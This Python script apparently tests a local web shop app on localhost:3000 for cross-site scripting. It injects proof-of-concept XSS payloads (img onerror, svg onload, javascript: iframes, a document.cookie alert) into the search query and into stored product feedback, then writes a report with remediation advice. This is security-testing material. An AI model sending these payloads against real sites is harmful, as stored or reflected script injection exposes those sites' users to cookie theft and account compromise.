import requests
import json
import time
import logging
import os
from datetime import datetime
from urllib.parse import quote
import html

class XSSAttacker:
    def __init__(self, target_url="http://localhost:3000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.results = []
        
        # Ensure required directories exist
        os.makedirs('../logs/security', exist_ok=True)
        os.makedirs('../reports', exist_ok=True)
        
        # Setup logging with UTF-8 file support
        log_file = '../logs/security/xss_attack.log'
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        stream_handler = logging.StreamHandler()
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - XSS - %(levelname)s - %(message)s',
            handlers=[file_handler, stream_handler]
        )
        self.logger = logging.getLogger(__name__)

    def safe_log(self, level, message_with_emoji, plain_message=None):
        """Log emoji to file, plain text to console to avoid cp1252 errors on Windows"""
        if plain_message is None:
            plain_message = (
                message_with_emoji
                .replace("🧪", "")
                .replace("🔍", "")
                .replace("⚠️", "")
                .replace("🚨", "")
                .replace("📄", "")
                .strip()
            )
        getattr(self.logger, level)(message_with_emoji)
        level_upper = level.upper()
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - XSS - {level_upper} - {plain_message}")

    def is_xss_reflected(self, payload, response_text):
        """Check if payload (or its HTML-encoded version) appears in response"""
        payload_lower = payload.lower()
        resp_lower = response_text.lower()
        return (
            payload_lower in resp_lower or
            html.escape(payload_lower) in resp_lower or
            payload_lower.replace("'", "\\'") in resp_lower
        )

    def test_search_reflected_xss(self):
        """Test for reflected XSS in search functionality"""
        self.safe_log('info', "🔍 Testing Reflected XSS - Search Function")
        
        payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                encoded = quote(payload)
                url = f"{self.target_url}/rest/products/search?q={encoded}"
                response = self.session.get(url, timeout=10)
                
                reflected = self.is_xss_reflected(payload, response.text)
                result = {
                    'type': 'reflected_xss',
                    'payload_id': i,
                    'payload': payload,
                    'url': url,
                    'reflected': reflected,
                    'status_code': response.status_code,
                    'timestamp': datetime.now().isoformat()
                }
                self.results.append(result)
                
                if reflected:
                    self.safe_log('warning', f"⚠️ Reflected XSS detected with payload {i}")
                else:
                    self.safe_log('info', f"Payload {i}: No reflection found")
                    
                time.sleep(0.5)
            except Exception as e:
                self.safe_log('error', f"Error testing payload {i}: {e}")
                self.results.append({
                    'type': 'reflected_xss',
                    'payload_id': i,
                    'payload': payload,
                    'error': str(e),
                    'reflected': False
                })

    def test_feedback_stored_xss(self):
        """Test for stored XSS via feedback/comment submission"""
        self.safe_log('info', "🧪 Testing Stored XSS - Feedback Submission")
        
        # Get a valid product ID
        product_id = 1
        try:
            prod_res = self.session.get(f"{self.target_url}/api/Products", timeout=5)
            if prod_res.status_code == 200:
                products = prod_res.json().get('data', [])
                if products:
                    product_id = products[0]['id']
        except:
            pass

        payloads = [
            "<img src=x onerror=alert(document.cookie)>",
            "<svg onload=alert('Stored XSS')>",
            "<body onload=alert('XSS')>"
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                feedback_data = {
                    "comment": payload,
                    "rating": 3,
                    "ProductId": product_id
                }
                response = self.session.post(
                    f"{self.target_url}/api/Feedbacks",
                    json=feedback_data,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                accepted = response.status_code in [200, 201]
                result = {
                    'type': 'stored_xss',
                    'payload_id': i,
                    'payload': payload,
                    'product_id': product_id,
                    'status_code': response.status_code,
                    'accepted': accepted,
                    'timestamp': datetime.now().isoformat()
                }
                self.results.append(result)
                
                if accepted:
                    self.safe_log('critical', f"🚨 Stored XSS payload accepted: {payload}")
                else:
                    self.safe_log('info', f"Payload {i}: Rejected by server")
                    
                time.sleep(1)
            except Exception as e:
                self.safe_log('error', f"Error submitting feedback payload {i}: {e}")
                self.results.append({
                    'type': 'stored_xss',
                    'payload_id': i,
                    'payload': payload,
                    'error': str(e),
                    'accepted': False
                })

    def generate_report(self):
        """Generate comprehensive XSS attack report"""
        total_tests = len(self.results)
        reflected_vulns = sum(1 for r in self.results if r.get('type') == 'reflected_xss' and r.get('reflected'))
        stored_vulns = sum(1 for r in self.results if r.get('type') == 'stored_xss' and r.get('accepted'))
        
        report = {
            'attack_type': 'Cross-Site Scripting (XSS)',
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'summary': {
                'total_payloads_tested': total_tests,
                'reflected_xss_found': reflected_vulns,
                'stored_xss_accepted': stored_vulns,
                'vulnerability_rate': (reflected_vulns + stored_vulns) / total_tests * 100 if total_tests > 0 else 0
            },
            'detailed_results': self.results,
            'recommendations': [
                "Implement proper output encoding (HTML, JS, URL contexts)",
                "Deploy Content Security Policy (CSP) headers",
                "Sanitize user input using trusted libraries (DOMPurify, etc.)",
                "Use modern frameworks with built-in XSS protection",
                "Conduct regular security testing"
            ]
        }
        
        report_path = '../reports/xss_attack_report.json'
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.safe_log('info', f"📄 XSS report saved: {reflected_vulns} reflected, {stored_vulns} stored vulnerabilities")
        return report

    def run_complete_attack(self):
        """Execute complete XSS attack suite"""
        self.safe_log('info', "🧪 Starting Comprehensive XSS Attack Simulation")
        
        self.test_search_reflected_xss()
        self.test_feedback_stored_xss()
        
        report = self.generate_report()
        
        print(f"\n⚠️ XSS ATTACK SUMMARY")
        print(f"   Total payloads tested: {report['summary']['total_payloads_tested']}")
        print(f"   Reflected XSS found: {report['summary']['reflected_xss_found']}")
        print(f"   Stored XSS accepted: {report['summary']['stored_xss_accepted']}")
        print(f"   Vulnerability rate: {report['summary']['vulnerability_rate']:.1f}%")
        
        return report

if __name__ == "__main__":
    attacker = XSSAttacker()
    attacker.run_complete_attack()